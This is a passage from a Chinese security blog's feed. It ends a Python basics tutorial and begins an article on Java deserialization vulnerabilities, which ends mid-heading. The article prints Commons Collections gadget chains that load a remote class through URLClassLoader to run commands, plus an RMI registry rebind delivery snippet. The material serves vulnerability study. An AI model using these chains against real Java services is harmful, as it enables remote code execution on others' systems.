zero</code></pre><p><em>每个异常都是某个类（这里是<code>ZeroDivisionError</code> ）的实例；能以各种方式引发和捕获这些实例，从而逮住错误并采取措施</em></p><h3 id="2-异常引发"><a href="#2-异常引发" class="headerlink" title="2. 异常引发"></a>2. 异常引发</h3><p><strong><em>(1) raise 语句</em></strong></p><p><em>要引发异常，可使用 <code>raise</code> 语句，并将一个类（必须是 <code>Exception</code> 的子类）或实例作为参数；将类作为参数时，将自动创建一个实例</em></p><pre><code>&gt;&gt;&gt; raise ExceptionTraceback (most recent call last):  File &quot;&lt;pyshell#307&gt;&quot;, line 1, in &lt;module&gt;    raise ExceptionException&gt;&gt;&gt; raise Exception(&apos;hyperdrive overload&apos;)Traceback (most recent call last):  File &quot;&lt;pyshell#308&gt;&quot;, line 1, in &lt;module&gt;    raise Exception(&apos;hyperdrive overload&apos;)Exception: hyperdrive overload</code></pre><p><em>在第一个示例（ raise Exception ）中，引发的是通用异常，没有指出出现了什么错误。在第二个示例中，添加了错误消息 <code>hyperdrive overload</code></em></p><p><img src="http://pguklm607.bkt.clouddn.com/%E5%86%85%E7%BD%AE%E5%BC%82%E5%B8%B8.png" alt=""></p><p><strong><em>(2) 自定义异常</em></strong></p><p><em>就像创建其他类一样，但务必直接或间接地继承 <code>Exception</code> （这意味着从任何内置异常类派生都可以）</em></p><pre><code>class SomeCustomException(Exception): pass</code></pre><h3 id="3-捕获异常"><a href="#3-捕获异常" class="headerlink" title="3. 捕获异常"></a>3. 捕获异常</h3><p><em>捕获异常：对异常进行处理，可使用<code>try/except</code> 语句</em></p><pre><code>x = int(input(&apos;Enter the first number: &apos;))y = int(input(&apos;Enter the second number: &apos;))print(x / y)Enter the first number: 1Enter the second number: 0Traceback (most recent call last):  File &quot;H:/Code/Python/except.py&quot;, line 3, in &lt;module&gt;    print(x / y)ZeroDivisionError: division by zero</code></pre><p><em>捕获这种异常并对错误进行处理（这里打印一条对用户更友好的错误消息）</em></p><pre><code>try:    x = int(input(&apos;Enter the first number: &apos;))    y = int(input(&apos;Enter the second number: &apos;))    print(x / y)except ZeroDivisionError:    print(&apos;The second number can\&apos;t be zero! &apos;)===================== RESTART: H:/Code/Python/except.py =====================Enter the first number: 1Enter the second number: 0The second number can&apos;t be zero! </code></pre><p><em>异常从函数向外传播到调用函数的地方。如果在这里也没有被捕获，异常将向程序的最顶层传播；可使用 <code>try/except</code> 来捕获他人所编写函数引发的异常 </em></p><p><strong><em>finally 字句</em></strong></p><p> <em>finally 子句，可用于在发生异常时执行清理工作，不管 try 子句中发生什么异常，都将执行 finally 子句</em></p><pre><code>x = Nonetry:    x = 1/0finally:    print(&apos;Cleaning up...&apos;)    del x可在一条语句中同时包含 try 、except 、finally 和 elsetry:    1 / 0except NameError:    print(&quot;Unknown variable&quot;)else:    print(&quot;That went well!&quot;)finally:    print(&quot;Cleaning up.&quot;)</code></pre><h3 id="4-异常和函数"><a href="#4-异常和函数" class="headerlink" title="4. 异常和函数"></a>4. 异常和函数</h3><p><em>如果不处理函数中引发的异常，它将向上传播到调用函数的地方。如果在那里也未得到处理，异常将继续传播，直至到达主程序（全局作用域）。如果主程序中也没有异常处理程序，程序将终止并显示栈跟踪消息</em></p><pre><code>&gt;&gt;&gt; def faulty():... raise Exception(&apos;Something is wrong&apos;)...&gt;&gt;&gt; def ignore_exception():... faulty()...&gt;&gt;&gt; def handle_exception():... try:...  faulty()...  except:...  print(&apos;Exception handled&apos;)...&gt;&gt;&gt; ignore_exception()Traceback (most recent call last):File &apos;&lt;stdin&gt;&apos;, line 1, in ?File &apos;&lt;stdin&gt;&apos;, line 2, in ignore_exceptionFile &apos;&lt;stdin&gt;&apos;, line 2, in faultyException: Something is wrong&gt;&gt;&gt; handle_exception()Exception handled</code></pre><p><em>faulty 中引发的异常依次从 faulty 和 ignore_exception 向外传播，最终导致显示一条栈跟踪消息。调用 handle_exception 时，异常最终传播到 handle_exception ，并被这里的try / except 语句处理</em></p><h3 id="5-警告提示"><a href="#5-警告提示" class="headerlink" title="5. 警告提示"></a>5. 警告提示</h3><p><em>如果只想发出警告，指出情况偏离了正轨，可使用模块 warnings 中的函数 warn</em></p><pre><code>&gt;&gt;&gt; from warnings import warn&gt;&gt;&gt; warn(&quot;Don&apos;t do it...&quot;)Warning (from warnings module):  File &quot;H:/Code/Python/except.py&quot;, line 1    try:UserWarning: Don&apos;t do it...</code></pre><p><em>如果其他代码在使用你的模块，可使用模块 warnings 中的函数 filterwarnings 来抑制你发出的警告（或特定类型的警告），并指定要采取的措施，如” error “或” ignore “</em></p><pre><code>&gt;&gt;&gt; from warnings import filterwarnings&gt;&gt;&gt; filterwarnings(&quot;ignore&quot;)&gt;&gt;&gt; warn(&quot;Anyone out there?&quot;)&gt;&gt;&gt; filterwarnings(&quot;error&quot;)&gt;&gt;&gt; warn(&quot;Something is very wrong!&quot;)Traceback (most recent call last):    File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;UserWarning: Something is very wrong!</code></pre><hr><h2 id="0x09-迭代器-生成器"><a href="#0x09-迭代器-生成器" class="headerlink" title="0x09 迭代器/生成器"></a>0x09 迭代器/生成器</h2><h3 id="1-迭代器"><a href="#1-迭代器" class="headerlink" title="1. 迭代器"></a>1. 迭代器</h3><p><em>迭代是是访问集合元素的一种方式，从集合的第一个元素开始访问，直到所有的元素被访问完结束，迭代器只能往前不会后退</em></p><p><em>迭代器有两个基本的方法：iter() 和 next()</em></p><pre><code>&gt;&gt;&gt;list=[1,2,3,4]&gt;&gt;&gt; it = iter(list) # 创建迭代器对象&gt;&gt;&gt; print (next(it)) # 输出迭代器的下一个元素1&gt;&gt;&gt; print (next(it))2# 迭代器import syslist=[1,3,5,7,9]it = iter(list)while True:    try:        print(next(it))    except StopIteration:        sys.exit()</code></pre><h3 id="2-生成器"><a href="#2-生成器" class="headerlink" title="2. 生成器"></a>2. 生成器</h3><p><em>使用了 yield 的函数被称为生成器（generator），生成器是一个返回迭代器的函数，只能用于迭代操作</em></p><p><em>在调用生成器运行的过程中，每次遇到 yield 时函数会暂停并保存当前所有的运行信息，返回 yield 的值, 并在下一次执行 next() 方法时从当前位置继续运行</em></p><pre><code>import sysdef fibonacci(n): # 生成器函数 - 斐波那契    a, b, counter = 0, 1, 0    while True:        if (counter &gt; n):             return        yield a        a, b = b, a + b        counter += 1f = fibonacci(10) # f 是一个迭代器，由生成器返回生成while True:    try:        print (next(f), end=&quot; &quot;)    except StopIteration:        sys.exit()</code></pre><hr><h2 id="0x0A-正则表达式"><a href="#0x0A-正则表达式" class="headerlink" title="0x0A 正则表达式"></a>0x0A 正则表达式</h2><h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h3><ul><li><em>正则表达式为高级的文本模式匹配、抽取、与/或文本形式的搜索和替换功能提供了基础</em></li></ul><ul><li><p><em>正则表达式（简称为 regex）是一些由字符和特殊符号组成的字符串，它们描述了模式的重复或者表述多个字符，于是正则表达式能按照某种模式匹配一系列有相似特征的字符串</em></p></li><li><p><em>Python 通过标准库中的 re 模块来支持正则表达式</em></p></li></ul><h3 id="2-模式字符"><a href="#2-模式字符" class="headerlink" title="2. 模式字符"></a>2. 模式字符</h3><p><strong>(1) 模式元素</strong></p><p><img src="http://pguklm607.bkt.clouddn.com/%E6%A8%A1%E5%BC%8F%E5%AD%97%E7%AC%A6.png" alt=""></p><p><strong>(2) 常用实例</strong></p><p><img src="http://pguklm607.bkt.clouddn.com/%E6%A8%A1%E5%BC%8F%E5%AD%97%E7%AC%A6.png" alt=""></p><p><strong>(3) 用法详解</strong></p><p><strong><em>1. 使用择一匹配符号匹配多个正则表达式模式</em></strong></p><p><em>表示择一匹配的管道符号（|），也就是键盘上的竖线，表示一个“从多个模式中选择其一”的操作，使得正则表达式能够匹配多个字符串而不仅仅只是一个字符串</em></p><p><img src="http://pguklm607.bkt.clouddn.com/%E6%8B%A9%E4%B8%80.png" alt=""></p><p><strong><em>2. 匹配任意单个字符串</em></strong></p><p><em>点号或者句点（.）符号匹配除了换行符\n 以外的任何字符，要显式匹配一个句点符号本身，必须使用反斜线转义句点符号的功能，例如“.”</em></p><p><img src="http://pguklm607.bkt.clouddn.com/%E4%BB%BB%E6%84%8F%E5%8D%95%E4%B8%AA.png" alt=""></p><p><strong><em>3. 从字符串起始或者结尾或者单词边界匹配</em></strong></p><ul><li><p><em>使用脱字符（^）或者特殊字符\A（反斜线和大写字母 A）匹配字符串的开始位置</em></p></li><li><p><em>美元符号（$）或者\Z将用于匹配字符串的末尾位置</em></p></li></ul><p><img src="http://pguklm607.bkt.clouddn.com/%E5%A7%8B%E7%BB%88.png" alt=""></p><ul><li><em>特殊字符\b 和\B 可以用来匹配字符边界，\b 将用于匹配一个单词的边界，\B 将匹配出现在一个单词中间的模式</em></li></ul><p><img src="http://pguklm607.bkt.clouddn.com/the.png" alt=""></p><p><strong><em>4. 创建字符集</em></strong></p><p><em>方括号，该正则表达式能够匹配一对方括号中包含的任何字符，方括号仅仅表示逻辑或的功能</em></p><p><img src="http://pguklm607.bkt.clouddn.com/%E5%AD%97%E7%AC%A6%E9%9B%86.png" alt=""></p><p><strong><em>5. 限定范围和否定</em></strong></p><ul><li><p><em>方括号中两个符号中间用连字符（-）连接，用于指定一个字符的范围</em></p></li><li><p><em>脱字符（^）紧跟在左方括号后面，这个符号就表示不匹配给定字符集中的任何一个字符</em></p></li></ul><p><img src="http://pguklm607.bkt.clouddn.com/%E8%8C%83%E5%9B%B4.png" alt=""></p><p><strong><em>6. 存在性和频数匹配</em></strong></p><pre><code>特殊符号*、+和？，所有这些都可以用于匹配一个、多个或者没有出现的字符串模式，大括号操作符（{}），里面或者是单个值或者是一对由逗号分隔的值，这将最终精确地匹配前面的正则表达式 N 次（如果是{N}）或者一定范围的次数</code></pre><p><img src="http://pguklm607.bkt.clouddn.com/%E9%97%AD%E5%8C%85.png" alt=""></p><p><strong><em>7. 表示字符集的特殊字符</em></strong></p><pre><code>使用 d 表示匹配任何十进制数字，（\w）能够用于表示全部字母数字的字符集，相当于[A-Za-z0-9_]的缩写形式，\s 可以用来表示空格字符，\D 表示任何非十进制数（与[^0-9]相同</code></pre><p><img src="http://pguklm607.bkt.clouddn.com/%E5%AD%97%E7%AC%A6%E7%89%B9%E6%AE%8A.png" alt=""></p><p><strong><em>8. 使用圆括号指定分组</em></strong></p><pre><code>当使用正则表达式时，一对圆括号可以实现以下任意一个（或者两个）功能：对正则表达式进行分组，匹配子组</code></pre><p><img src="http://pguklm607.bkt.clouddn.com/%E6%8C%87%E5%AE%9A%E5%88%86%E7%BB%84.png" alt=""></p><p><strong><em>9. 扩展表示法</em></strong></p><pre><code>扩展表示法，它们是以问号开始（?…），通常用于在判断匹配之前提供标记，实现一个前视（或者后视）匹配，或者条件检查</code></pre><p><img src="http://pguklm607.bkt.clouddn.com/%E6%89%A9%E5%B1%95%E8%A1%A8%E7%A4%BA.png" alt=""></p><h3 id="3-正则模块"><a href="#3-正则模块" class="headerlink" title="3. 正则模块"></a>3. 正则模块</h3><p><em>Python 通过使用 re 模块来支持正则表达式，re 模块支持更强大而且更通用的 Perl 风格（Perl 5 风格）的正则表达式，该模块允许多个线程共享同一个已编译的正则表达式对象，也支持命名子组</em></p><p><strong>re 模块：核心函数和方法</strong></p><p><img src="http://pguklm607.bkt.clouddn.com/%E6%AD%A3%E5%88%99%E5%87%BD%E6%95%B0.png" alt=""></p><p><strong><em>(1) group()和 groups()方法 - 匹配对象</em></strong></p><pre><code>当处理正则表达式时，除了正则表达式对象之外，还有另一个对象类型：匹配对象。这些是成功调用 match()或者 search()返回的对象。匹配对象有两个主要的方法：group()和groups()；group()要么返回整个匹配对象，要么根据要求返回特定子组。groups()则仅返回一个包含唯一或者全部子组的元组</code></pre><p><img src="http://pguklm607.bkt.clouddn.com/group.png" alt=""></p><p><strong><em>(2) match()方法 - 匹配字符串</em></strong></p><pre><code>match()是将要介绍的第一个 re 模块函数和正则表达式对象（regex object）方法；match()函数试图从字符串的起始部分对模式进行匹配。如果匹配成功，就返回一个匹配对象；如果匹配失败，就返回 None，匹配对象的 group()方法能够用于显示那个成功的匹配</code></pre><p><em>函数语法：</em></p><pre><code>re.match(pattern, string, flags=0)</code></pre><p><em>参数说明：</em></p><p><img src="http://pguklm607.bkt.clouddn.com/match.png" alt=""></p><p><strong><em>(3) search()方法 - 搜索匹配</em></strong></p><pre><code>search()会用它的字符串参数，在任意位置对给定正则表达式模式搜索第一次出现的匹配情况；如果搜索到成功的匹配，就会返回一个匹配对象；否则，返回 None</code></pre><p><em>函数语法：</em></p><pre><code>re.search(pattern, string, flags=0)</code></pre><p><em>参数说明：</em></p><p><img src="http://pguklm607.bkt.clouddn.com/search.png" alt=""></p><p><strong><em>re.match与re.search的区别</em></strong></p><pre><code>re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配</code></pre><p><strong><em>(4) sub()与subn() - 搜索与替换</em></strong></p><pre><code>Python 的re模块提供了sub()和 subn()用于替换字符串中的匹配项，用来替换的部分通常是一个字符串，但它也可能是一个函数，该函数返回一个用来替换的字符串。subn()和 sub()一样，但 subn()还返回一个表示替换的总数，替换后的字符串和表示替换总数的数字一起作为一个拥有两个元素的元组返回</code></pre><p><em>语法：</em></p><pre><code>re.sub(pattern, repl, string, max=0)</code></pre><p><strong><em>(5) findall()和 finditer() - 查找每一次出现的位置</em></strong></p><p><em>findall()函数</em></p><pre><code>findall()查询字符串中某个正则表达式模式全部的非重复出现情况。这与 search()在执行字符串搜索时类似，但与 match()和 search()的不同之处在于，findall()总是返回一个列表。如果 findall()没有找到匹配的部分，就返回一个空列表，但如果匹配成功，列表将包含所有成功的匹配部分（从左向右按出现顺序排列）</code></pre><p><em>finditer() 函数</em></p><pre><code>finditer()函数是在 Python 2.2 版本中添加回来的，这是一个与 findall()函数类似但是更节省内存的变体。两者之间以及和其他变体函数之间的差异（很明显不同于返回的是一个迭代器还是列表）在于，和返回的匹配字符串相比，finditer()在匹配对象中迭代</code></pre><p><strong><em>(6) split() - 限定模式分隔字符串</em></strong></p><pre><code>re 模块和正则表达式的对象方法 split()对于相对应字符串的工作方式是类似的，但是与分割一个固定字符串相比，它们基于正则表达式的模式分隔字符串，为字符串分隔功能添加一些额外的威力</code></pre><hr><h2 id="0xFF-学习资源"><a href="#0xFF-学习资源" class="headerlink" title="0xFF 学习资源"></a>0xFF 学习资源</h2><h3 id="1-基础学习"><a href="#1-基础学习" class="headerlink" title="1. 基础学习"></a>1. 基础学习</h3><ul><li><p><a href="https://pan.baidu.com/s/1d8JZCmzM668yaDLGQy4iSg" target="_blank" rel="noopener">《流畅的Python》</a></p></li><li><p><a href="https://pan.baidu.com/s/1TJ_YMvVAihLm_rdGIqL9Hg" target="_blank" rel="noopener">《Python 基础教程 第3版》</a></p></li><li><p><a href="https://pan.baidu.com/s/1Si1N2hKEtULVshB6K7eNzQ" target="_blank" rel="noopener">《Python 核心编程 第三版》</a></p></li><li><p><a href="https://docs.python.org/2.7/" target="_blank" rel="noopener">Python 2.7 documentation </a></p></li><li><p><a href="https://docs.python.org/3.6/" target="_blank" rel="noopener">Python 3.6 documentation</a></p></li><li><p><a href="https://www.w3cschool.cn/search?w=python" target="_blank" rel="noopener">w3cschool python 学习资源</a></p></li><li><p><a href="http://www.runoob.com/python/python-tutorial.html" target="_blank" rel="noopener">runoob - Python 2.x 基础教程</a></p></li><li><p><a href="http://www.runoob.com/python3/python3-tutorial.html" target="_blank" rel="noopener">runoob - Python 3.x 基础教程</a></p></li><li><p><a href="https://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000" target="_blank" rel="noopener">廖雪峰 - Python 教程</a></p></li></ul><h3 id="2-Python-Web-框架"><a href="#2-Python-Web-框架" class="headerlink" title="2. Python Web 框架"></a>2. Python Web 框架</h3><ul><li><p><a href="https://pan.baidu.com/s/1jxCzzQ0PLF4yyTHT2jK_9w" target="_blank" rel="noopener">《Django 基础教程》</a></p></li><li><p><a href="https://pan.baidu.com/s/1nZcSYXu8veJH48TaOtDl5w" target="_blank" rel="noopener">《Flask Web 开发》</a></p></li><li><p><a href="https://pan.baidu.com/s/1Si1N2hKEtULVshB6K7eNzQ" target="_blank" rel="noopener">《Python 核心编程》</a></p></li><li><p><a href="http://docs.jinkan.org/docs/flask/" target="_blank" rel="noopener">Python Flask 用户指南</a></p></li><li><p><a href="https://www.w3cschool.cn/django/" target="_blank" rel="noopener">W3Cschool - Django 教程</a></p></li></ul><h2 id="3-网络爬虫"><a href="#3-网络爬虫" class="headerlink" title="3. 网络爬虫"></a>3. 网络爬虫</h2><ul><li><p><a href="https://pan.baidu.com/s/1v_txruHUKGjih-Po4kUBog" target="_blank" rel="noopener">《Python3 网络爬虫开发实战》</a></p></li><li><p><a href="http://docs.pyspider.org/en/latest/" target="_blank" rel="noopener">pyspider 官方文档 </a></p></li><li><p><a href="https://doc.scrapy.org/en/latest/" target="_blank" rel="noopener">Scrapy 官方文档</a></p></li><li><p><a href="http://wiki.jikexueyuan.com/project/python-crawler-guide/" target="_blank" rel="noopener">Python 爬虫学习系列教程</a></p></li><li><p><a href="https://github.com/facert/awesome-spider" target="_blank" rel="noopener">Github - awesome-spider</a></p></li><li><p><a href="https://github.com/Jack-Cherish/python-spider" target="_blank" rel="noopener">Github - Python3 网络爬虫实战</a></p></li></ul><h2 id="4-安全运用"><a href="#4-安全运用" class="headerlink" title="4. 安全运用"></a>4. 安全运用</h2><ul><li><p><a href="https://pan.baidu.com/s/12z5ktn3ay0BNVDVAPNYskA" target="_blank" rel="noopener">《Violent Python》</a></p></li><li><p><a href="https://pan.baidu.com/s/18gFY4wImYfJ9lkc2LZ949g" target="_blank" rel="noopener">《Black Hat Python》</a></p></li><li><p><a href="https://pan.baidu.com/s/18gFY4wImYfJ9lkc2LZ949g" target="_blank" rel="noopener">《Gray Hat Python》</a></p></li><li><p><a href="https://wizardforcel.gitbooks.io/violent-python/content/" target="_blank" rel="noopener">Violent Python 在线版</a></p></li><li><p><a href="https://www.gitbook.com/book/wizardforcel/py-sec-tutorial" target="_blank" rel="noopener">Python 安全编程教程</a></p></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;本文对 &lt;a href=&quot;https://www.python.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Python&lt;/a&gt; 编程语言的基本用法简要总结，对 Python Web 主流开发框架，网络爬虫，安全运用等学习资源进行梳理，便于查询参阅&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
      <category term="0x02 原理浅析" scheme="http://www.firehacker.top/categories/0x02-%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/"/>
    
      <category term="编程开发" scheme="http://www.firehacker.top/categories/0x02-%E5%8E%9F%E7%90%86%E6%B5%85%E6%9E%90/%E7%BC%96%E7%A8%8B%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="Python" scheme="http://www.firehacker.top/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>反序列化漏洞原理及分析</title>
    <link href="http://www.firehacker.top/2018/10/07/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%8F%8A%E5%88%86%E6%9E%90/"/>
    <id>http://www.firehacker.top/2018/10/07/反序列化漏洞原理及分析/</id>
    <published>2018-10-07T05:22:09.000Z</published>
    <updated>2018-10-24T07:01:59.906Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>序列化是将运行时变量和程序对象转换成可以存储或传输的形式的过程，反序列化是将序列化形式转换回内存变量和程序对象的相反过程；许多高级的语言（如C＃，Java和PHP）都内置了对数据序列化的支持，如果攻击者控制的数据被反序列化，影响内存中的变量和程序对象，那么可以使用这些变量和对象的代码流。本文对序列化/反序列化基本概念，反序列化漏洞原理及利用进行总结</p></blockquote><a id="more"></a><hr><h2 id="0x01-序列化与反序列化"><a href="#0x01-序列化与反序列化" class="headerlink" title="0x01 序列化与反序列化"></a>0x01 序列化与反序列化</h2><h3 id="1-概念简述"><a href="#1-概念简述" class="headerlink" title="1. 概念简述"></a>1. 概念简述</h3><p><strong><em>序列化：</em></strong>Java序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中；Java中的<code>ObjectOutputStream</code>类的<code>writeObject()</code>方法可以实现序列化</p><p><strong><em>反序列化：</em></strong>Java反序列化即逆过程，由字节流还原成对象；Java中的<code>ObjectInputStream</code>类的<code>readObject()</code>方法用于反序列化</p><h3 id="2-应用场景"><a href="#2-应用场景" class="headerlink" title="2. 应用场景"></a>2. 应用场景</h3><pre><code>1. 一般情况，服务器启动后，就不会再关闭了，但是如果逼不得已需要重启，而用户会话还在进行相应的操作，这时就需要使用序列化将session信息保存起来放在硬盘，服务器重启后，又重新加载2. 很多应用中，需要对某些对象进行序列化，让它们离开内存空间，入住物理硬盘，以便减轻内存压力或便于长期保存</code></pre><h3 id="3-Java-API-实现"><a href="#3-Java-API-实现" class="headerlink" title="3. Java API 实现"></a>3. Java API 实现</h3><p><strong><em>位置：</em></strong> <code>Java.io.ObjectOutputStream</code> 　<code>java.io.ObjectInputStream</code></p><p><strong><em>序列化：</em></strong> <code>ObjectOutputStream类 --&gt; writeObject()</code></p><pre><code>该方法对参数指定的obj对象进行序列化，把字节序列写到一个目标输出流中，按Java的标准约定是给文件一个.ser扩展名</code></pre><p><strong><em>反序列化：</em></strong><code>ObjectInputStream类 --&gt; readObject()</code></p><pre><code>该方法从一个源输入流中读取字节序列，再把它们反序列化为一个对象，并将其返回</code></pre><h3 id="4-测试代码"><a href="#4-测试代码" class="headerlink" title="4. 测试代码"></a>4. 测试代码</h3><pre><code>import java.io.*;/*import java.io.ObjectOutputStream;import java.io.ObjectInputStream;import java.io.FileOutputStream;import java.io.FileInputStream;*/public class Java_Test{    public static void main(String args[]) throws Exception {        String obj = &quot;ls &quot;;        // 将序列化对象写入文件object.txt中        FileOutputStream fos = new FileOutputStream(&quot;aa.ser&quot;);        ObjectOutputStream os = new ObjectOutputStream(fos);        os.writeObject(obj);        os.close();        // 从文件object.txt中读取数据        FileInputStream fis = new FileInputStream(&quot;aa.ser&quot;);        ObjectInputStream ois = new ObjectInputStream(fis);        // 通过反序列化恢复对象obj        String obj2 = (String)ois.readObject();        System.out.println(obj2);        ois.close();    }}</code></pre><p><em>先通过输入流创建一个文件，再调用<code>ObjectOutputStream</code>类的 <code>writeObject方</code>法把序列化的数据写入该文件；然后调用<code>ObjectInputStream</code>类的<code>readObject</code>方法反序列化数据并打印数据内容</em></p><p><strong><em>对象序列化步骤</em></strong></p><pre><code>1. 创建一个对象输出流，它可以包装一个其他类型的目标输出流，如文件输出流2. 通过对象输出流的writeObject()方法写对象</code></pre><p><strong><em>对象反序列化步骤</em></strong></p><pre><code>1. 创建一个对象输入流，它可以包装一个其他类型的源输入流，如文件输入流2. 通过对象输入流的readObject()方法读取对象</code></pre><h2 id="0x02-漏洞原理及分析"><a href="#0x02-漏洞原理及分析" class="headerlink" title="0x02 漏洞原理及分析"></a>0x02 漏洞原理及分析</h2><h3 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1. 漏洞原理"></a>1. 漏洞原理</h3><p><em>如果Java应用对用户输入，即不可信数据做了反序列化处理，那么攻击者可以通过构造恶意输入，让反序列化产生非预期的对象，非预期的对象在产生过程中就有可能带来任意代码执行</em></p><h3 id="2-漏洞分析"><a href="#2-漏洞分析" class="headerlink" title="2. 漏洞分析"></a>2. 漏洞分析</h3><p><strong><em>(1) 漏洞起源</em></strong></p><p><em><a href="http://commons.apache.org/proper/commons-collections/" target="_blank" rel="noopener">Apache Commons Collections</a>是一个扩展了Java标准库里的Collection结构的第三方基础库。它包含有很多<a href="https://commons.apache.org/proper/commons-collections/javadocs/api-4.2/index.html" target="_blank" rel="noopener">jar工具包</a>，提供了很多强有力的数据结构类型并且实现了各种集合工具类</em></p><p><img src="http://pdeise3e3.bkt.clouddn.com/packages.png" alt=""></p><p><em><code>org.apache.commons.collections</code>提供一个类包来扩展和增加标准的Java的collection框架，也就是说这些扩展也属于collection的基本概念，只是功能不同。Java中的collection可以理解为一组对象，collection里面的对象称为collection的对象。具象的collection为set，list，queue等等，它们是集合类型。换一种理解方式，collection是set，list，queue的抽象</em></p><p><img src="http://pdeise3e3.bkt.clouddn.com/class.png" alt=""></p><p><em>作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发，正是因为在大量web应用程序中这些类的实现以及方法的调用，导致了反序列化用漏洞的普遍性和严重性</em></p><p><em><code>Apache Commons Collections</code>中有一个特殊的接口，其中有一个实现该接口的类可以通过<strong>调用Java的反射机制来调用任意函数</strong>，叫做<a href="https://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/functors/InvokerTransformer.html" target="_blank" rel="noopener">InvokerTransformer</a></em></p><pre><code>JAVA反射机制    在运行状态中：　　　　　　对于任意一个类，都能够判断一个对象所属的类；　　　　　　对于任意一个类，都能够知道这个类的所有属性和方法；　　　　　　对于任意一个对象，都能够调用它的任意一个方法和属性；    这种动态获取的信息以及动态调用对象的方法的功能称为java语言的反射机制</code></pre><p><strong><em>(2) POC 构造</em></strong></p><pre><code>构造一个对象 ——&gt; 反序列化 ——&gt; 提交数据</code></pre><p><em>在org.apache.commons.collections内提供了一个接口类叫<a href="https://commons.apache.org/proper/commons-collections/javadocs/api-3.2.2/org/apache/commons/collections/Transformer.html" target="_blank" rel="noopener">Transformer</a></em></p><p><em>接口于Transformer的类都具备把一个对象转化为另一个对象的功能。目前已知接口于Transformer的类，如下如所示</em></p><p><img src="http://pdeise3e3.bkt.clouddn.com/transform.png" alt=""></p><p><img src="http://pdeise3e3.bkt.clouddn.com/poc.png" alt=""></p><p><em>Apache Commons Collections中已经实现了一些常见的Transformer，其中有一个可以通过Java的反射机制来调用任意函数，叫做InvokerTransformer</em></p><pre><code>InvokerTransformer(String methodName, Class[] paramTypes, Object[] args)</code></pre><p><em>参数依次为：方法名称，参数类型，参数对象</em></p><pre><code>new InvokerTransformer(    &quot;getMethod&quot;,     new Class[]  {String.class, Class[].class },     new Object[] {&quot;getRuntime&quot;, new Class[0] }),new InvokerTransformer(    &quot;invoke&quot;,     new Class[] {Object.class, Object[].class },     new Object[] {null, null }),new InvokerTransformer(    &quot;exec&quot;,     new Class[] {String.class },     new Object[] {&quot;gedit&quot;})</code></pre><p><strong><em>(3) POC 实例</em></strong></p><p><em>A. 基于报错的反序列化transformer链</em></p><pre><code>Transformer[] transformers = new Transformer[] {new ConstantTransformer(Java.net.URLClassLoader.class),new InvokerTransformer(    &quot;getConstructor&quot;,     new Class[] {Class[].class},     new Object[] {new Class[]{Java.net.URL[].class}}),new InvokerTransformer(    &quot;newInstance&quot;,     new Class[] {Object[].class},     new Object[] { new Object[] { new Java.net.URL[] { new Java.net.URL(url) }}}),new InvokerTransformer(    &quot;loadClass&quot;,    new Class[] { String.class },     new Object[] { &quot;ErrorBaseExec&quot; }),new InvokerTransformer(    &quot;getMethod&quot;,    new Class[]{String.class, Class[].class},     new Object[]{&quot;do_exec&quot;, new Class[]{String.class}}),new InvokerTransformer(    &quot;invoke&quot;,    new Class[]{Object.class, Object[].class},     new Object[]{null, new String[]{cmd}})}; </code></pre><p><em>先建立一个读取远程jar文件的类 URLClassLoader，实例化这个类，传入要访问的url，再读取远程加载类，接着获取类方法，然后反射这个方法</em></p><p><em>B. RMI 利用</em></p><pre><code>Transformer transformedChain = new ChainedTransformer(transformers);Map BeforeTransformerMap = new HashMap();innerMap.put(&quot;value&quot;, &quot;value&quot;);Map AfterTransformerMap = TransformedMap.decorate(BeforeTransformerMap, null, transformedChain);Class cl = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);Constructor ctor = cl.getDeclaredConstructor(Class.class, Map.class);ctor.setAccessible(true);Object instance = ctor.newInstance(Target.class, AfterTransformerMap);InvocationHandler h = (InvocationHandler) instance;Remote r = Remote.class.cast(Proxy.newProxyInstance(                        Remote.class.getClassLoader(),                         new Class[]{Remote.class},                         h));try{Registry registry = LocateRegistry.getRegistry(ip, port);registry.rebind(&quot;&quot;, r); // r is remote obj}catch (Throwable e) {e.printStackTrace();}  </code></pre><p><em>利用逻辑如下</em>    </p><pre><code>1. 建立实例对象instance2. 实例对象instance 转化为 InvocationHandler类型的句柄h（因为instance是序列化后的内容，所以instance就是一串数据）3. 把句柄h附载到Remote类实例 r上4. 向远程服务器注册，得到远程注册对象 registry5. 向远程注册对象registry注册 实例r </code></pre><p><em>Java的RMI中，我们允许向远程已运行的jvm虚拟环境中绑定（rebind函数，也可以理解为添加）一些实例对象，通过RMI协议传输一些序列化好的内容，这样服务端解析（也就是反序列化）传过来的数据后，便可把解析后的内容添加到运行环境中 </em>  </p><hr><h2 id="0x03-漏洞挖掘及工具"><a href="#0x03-漏洞挖掘及工具" class="headerlink" title="0x03 漏洞挖掘及工具"></a>0x03 漏洞挖掘及工具</h2><h3 id="1-漏洞触发场景"><a href="#1-漏洞触发场景" class="headerlink" title="1. 漏洞触发场景"></a>1. 漏洞触发场景</h3><p><em>在java编写的web应用与web服务器间java通常会发送大量的序列化对象</em></p><pre><code>1. HTTP请求中的参数，cookies以及Parameters2. RMI协议，被广泛使用的RMI协议完全基于序列化3. JMX 同样用于处理序列化对象4. 自定义协议 用来接收与发送原始的java对象</code></pre><h3 id="2-漏洞挖掘思路"><a href="#2-漏洞挖掘思路" class="headerlink" title="2. 漏洞挖掘思路"></a>2. 